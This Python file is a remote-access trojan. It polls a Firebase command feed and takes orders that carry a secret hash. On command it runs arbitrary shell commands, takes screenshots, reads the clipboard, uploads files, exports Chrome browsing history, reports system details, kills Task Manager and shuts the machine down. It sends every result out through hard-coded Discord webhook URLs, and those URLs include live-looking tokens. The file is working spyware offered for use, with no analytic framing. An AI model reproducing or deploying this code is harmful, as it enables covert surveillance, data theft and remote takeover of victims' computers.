import os
import shutil
import sqlite3
import requests
import tempfile
import time
import pyperclip
import pyttsx3
import platform
import psutil
import socket
from PIL import ImageGrab
from datetime import datetime, timedelta
from pathlib import Path
import hashlib

# Your webhook URLs:
WEBHOOK_GENERAL = "https://discord.com/api/webhooks/1125359489892219246/lkgE9RrBv7N2xhI-B7e3rIP0HdkfMn1RVgeQHkk7_0dpWZXBjdZhcD2b-PqC2D5yJByf"
WEBHOOK_SCREENSHOT = "https://discord.com/api/webhooks/1125359492589744184/eCkQfw30sjpCpCXzyidqpM4aV_a7nTuyCSP4PNh47rkhvOKpb8W4FZ-rplDXrc-Cr_W3"
WEBHOOK_CLIPBOARD = "https://discord.com/api/webhooks/1125359495016904040/3_Dd_WaYQakMIY14e34gDqzy5AyOYDT4lWzz2NAD6x_wdOL4AcFuMyNPuHnbHKk3A42A"
WEBHOOK_SYSINFO = "https://discord.com/api/webhooks/1125359498289530192/XKoJj_9PgmePsbVplFz9ZxdId6ZQv-tB9He-TM_eQ5hcx7D2OUPLQ5s1aINPh7w6pg9n"
WEBHOOK_HISTORY = "https://discord.com/api/webhooks/1125359501662949696/Rl6p7BjGPKrJ64mp7q4_W-nXuU9bbG8gLgY5skQQyLFUZmjxm39hh7x7fDyqch8JDbWx"

# Firebase commands URL (ends with .json)
FIREBASE_URL_COMMANDS = "https://python-communication-aec5b-default-rtdb.firebaseio.com/commands.json"

SECRET_CODE = "mysupersecretcode"

def hash_code(code):
    return hashlib.sha256(code.encode()).hexdigest()

SECRET_HASH = hash_code(SECRET_CODE)

def now():
    return time.strftime("%H:%M:%S")

def log(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def send_discord_message(webhook, content=None, file=None, filename=None):
    data = {"content": f"🕒 {now()} - {content}"} if content else {}
    if file and filename:
        files = {"file": (filename, file)}
        try:
            response = requests.post(webhook, data=data, files=files)
            log(f"Sent file to webhook, status: {response.status_code}")
        except Exception as e:
            log(f"Failed to send file to webhook: {e}")
    else:
        try:
            response = requests.post(webhook, json=data)
            log(f"Sent message to webhook, status: {response.status_code}")
        except Exception as e:
            log(f"Failed to send message to webhook: {e}")

def kill_chrome():
    log("Attempting to kill Chrome processes...")
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
                log(f"Killed process {proc.pid} ({proc.info['name']})")
            except Exception as e:
                log(f"Failed to kill process {proc.pid}: {e}")

def chrome_time_to_readable(chrome_time):
    epoch_start = datetime(1601, 1, 1)
    try:
        return epoch_start + timedelta(microseconds=chrome_time)
    except Exception:
        return "Unknown time"

def get_chrome_history_path():
    local_app_data = os.getenv("LOCALAPPDATA")
    if not local_app_data:
        return None
    history_path = Path(local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "History"
    if not history_path.exists():
        return None
    return history_path

def copy_history_file():
    source_path = get_chrome_history_path()
    if not source_path:
        return None
    temp_dir = Path(tempfile.gettempdir())
    dest_path = temp_dir / "History_copy.db"
    try:
        shutil.copy2(source_path, dest_path)
        return dest_path
    except Exception as e:
        log(f"Error copying Chrome history DB: {e}")
        return None

def export_history_to_file(history_db, output_file):
    try:
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 50;
        """)
        rows = cursor.fetchall()

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("Chrome Browsing History Export\n")
            f.write("="*60 + "\n\n")
            for url, title, visit_count, last_visit_time in rows:
                visit_time = chrome_time_to_readable(last_visit_time)
                visit_time_str = visit_time.strftime("%Y-%m-%d %H:%M:%S") if isinstance(visit_time, datetime) else visit_time
                f.write(f"Title: {title or 'No title'}\n")
                f.write(f"URL: {url}\n")
                f.write(f"Visit Count: {visit_count}\n")
                f.write(f"Last Visit: {visit_time_str}\n")
                f.write("-" * 60 + "\n")

        conn.close()

        with open(output_file, 'rb') as f:
            send_discord_message(WEBHOOK_HISTORY, content="Here is the latest Chrome browsing history export.", file=f, filename="chrome_history_export.txt")
        log("Chrome history exported and sent to Discord webhook.")

    except Exception as e:
        log(f"Failed to export Chrome history: {e}")
        send_discord_message(WEBHOOK_GENERAL, f"Failed to export Chrome history: {e}")

def say_hello(text):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        log(f"Said hello: {text}")
        send_discord_message(WEBHOOK_GENERAL, f"Said hello: {text}")
    except Exception as e:
        log(f"TTS error: {e}")
        send_discord_message(WEBHOOK_GENERAL, f"TTS error: {e}")

def take_screenshot():
    try:
        path = Path(tempfile.gettempdir()) / "screenshot.png"
        img = ImageGrab.grab()
        img.save(path)
        log(f"Screenshot saved to {path}")
        with open(path, "rb") as f:
            send_discord_message(WEBHOOK_SCREENSHOT, "Screenshot taken", file=f, filename="screenshot.png")
        os.remove(path)
        log("Screenshot file removed after sending")
    except Exception as e:
        log(f"Screenshot error: {e}")
        send_discord_message(WEBHOOK_SCREENSHOT, f"Screenshot error: {e}")

def send_clipboard():
    try:
        clip = pyperclip.paste()
        log(f"Clipboard content:\n{clip}")
        send_discord_message(WEBHOOK_CLIPBOARD, f"📋 Clipboard:\n{clip}")
    except Exception as e:
        log(f"Clipboard error: {e}")
        send_discord_message(WEBHOOK_CLIPBOARD, f"Clipboard error: {e}")

def get_system_info():
    try:
        uname = platform.uname()
        boot_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time()))
        ip_addr = socket.gethostbyname(socket.gethostname())
        mem = psutil.virtual_memory()
        cpu_freq = psutil.cpu_freq()

        info = f"""**System Information** ({now()})
OS        : {uname.system} {uname.release}
Node Name : {uname.node}
Machine   : {uname.machine}
Processor : {uname.processor}
CPU Cores : {psutil.cpu_count(logical=False)} physical / {psutil.cpu_count()} logical
CPU Freq  : {cpu_freq.current:.2f} MHz
RAM       : {mem.total // (1024**2)} MB total
Disk      : {psutil.disk_usage('/').total // (1024**3)} GB total
Uptime    : Since {boot_time}
IP Addr   : {ip_addr}
"""
        log(info)
        send_discord_message(WEBHOOK_SYSINFO, info)
    except Exception as e:
        log(f"System info error: {e}")
        send_discord_message(WEBHOOK_SYSINFO, f"System info error: {e}")

def run_cmd(cmd):
    try:
        result = os.popen(cmd).read()
        log(f"CMD {cmd} output:\n{result}")
        send_discord_message(WEBHOOK_GENERAL, f"📟 CMD {cmd} output:\n{result}")
    except Exception as e:
        log(f"CMD error: {e}")
        send_discord_message(WEBHOOK_GENERAL, f"CMD error: {e}")

def mark_command_processed(key):
    try:
        patch_url = FIREBASE_URL_COMMANDS.rstrip(".json") + f"/{key}.json"
        requests.patch(patch_url, json={"processed": True})
        log(f"Marked command {key} as processed")
    except Exception as e:
        log(f"Failed to mark command {key} as processed: {e}")

def main_loop():
    processed_keys = set()

    # Mark all existing commands processed at start
    try:
        log("Marking all existing commands as processed on startup...")
        res = requests.get(FIREBASE_URL_COMMANDS)
        data = res.json()
        if data:
            for key in data.keys():
                mark_command_processed(key)
    except Exception as e:
        log(f"Failed to mark existing commands processed: {e}")

    while True:
        try:
            response = requests.get(FIREBASE_URL_COMMANDS)
            data = response.json()

            if data and isinstance(data, dict):
                for key, cmd_obj in data.items():
                    if key in processed_keys:
                        continue
                    if cmd_obj.get("processed", False):
                        processed_keys.add(key)
                        continue

                    if not isinstance(cmd_obj, dict):
                        log(f"Skipping non-dict command for key {key}")
                        processed_keys.add(key)
                        continue

                    if cmd_obj.get("code") != SECRET_HASH:
                        log(f"Invalid secret code for command key {key}")
                        processed_keys.add(key)
                        continue

                    text = cmd_obj.get("text", "").strip()
                    message = cmd_obj.get("message", "").strip()
                    parts = text.split(" ", 1)
                    command = parts[0].lower()
                    arg = parts[1] if len(parts) > 1 else ""

                    log(f"Received command: {command} with arg: {arg}")

                    if command == "shutdown":
                        log("Shutting down system...")
                        os.system("shutdown /s /t 0")

                    elif command == "close":
                        if arg == "taskmgr":
                            log("Closing Task Manager...")
                            os.system("taskkill /F /IM Taskmgr.exe")

                    elif command == "open":
                        if arg == "notepad":
                            log("Opening Notepad...")
                            os.system("start notepad")

                    elif command == "say" and arg == "hello":
                        if message:
                            say_hello(message)
                        else:
                            log("No message provided for say hello command.")

                    elif command == "screenshot":
                        take_screenshot()

                    elif command == "send" and arg == "clipboard":
                        send_clipboard()

                    elif command == "send" and arg.startswith("file"):
                        # Expected format: "send file <filepath>"
                        filepath = arg[5:].strip()
                        if os.path.isfile(filepath):
                            with open(filepath, "rb") as f:
                                send_discord_message(WEBHOOK_GENERAL, content=f"Sending file: {filepath}", file=f, filename=os.path.basename(filepath))
                        else:
                            log(f"File not found: {filepath}")
                            send_discord_message(WEBHOOK_GENERAL, f"File not found: {filepath}")

                    elif command == "export" and arg == "history":
                        log("Exporting Chrome history...")
                        history_copy = copy_history_file()
                        if history_copy:
                            temp_export = Path(tempfile.gettempdir()) / "chrome_history_export.txt"
                            export_history_to_file(history_copy, temp_export)
                            try:
                                os.remove(history_copy)
                            except Exception:
                                pass
                            try:
                                os.remove(temp_export)
                            except Exception:
                                pass

                    elif command == "sysinfo":
                        get_system_info()

                    else:
                        # treat as arbitrary cmd command
                        run_cmd(text)

                    # Mark command processed
                    mark_command_processed(key)
                    processed_keys.add(key)

        except Exception as e:
            log(f"Error in main loop: {e}")

        time.sleep(8)

if __name__ == "__main__":
    log("Receiver started.")
    main_loop()
